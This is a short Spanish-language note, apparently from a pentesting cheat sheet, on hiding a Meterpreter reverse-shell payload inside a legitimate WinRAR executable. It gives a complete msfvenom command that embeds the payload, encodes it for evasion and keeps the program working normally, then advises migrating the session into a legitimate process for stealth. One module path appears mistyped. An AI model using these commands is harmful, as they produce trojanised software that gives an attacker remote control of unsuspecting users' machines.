Inyectar payloads dentro de archivos ejecutables portables legitimos

Algunos portables no permiten la inyeccion de payloas. Una opcion muy comun es Winrar

```
kaliakali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe

Parametro -x par indicar en que portable insertaremos el payload
si en vez de -x hubiesemos puesto el parametro -k el ejecutable ademas de cargar el payload actua de manera natural
```

Una vez establecida la sesion con el objetivo lo mas prudente es migrar el proceso a un proceso legitimo que se este ejecutando en la maquina objetivo
```
meterpreter>run port/windows/manage/migrate
```
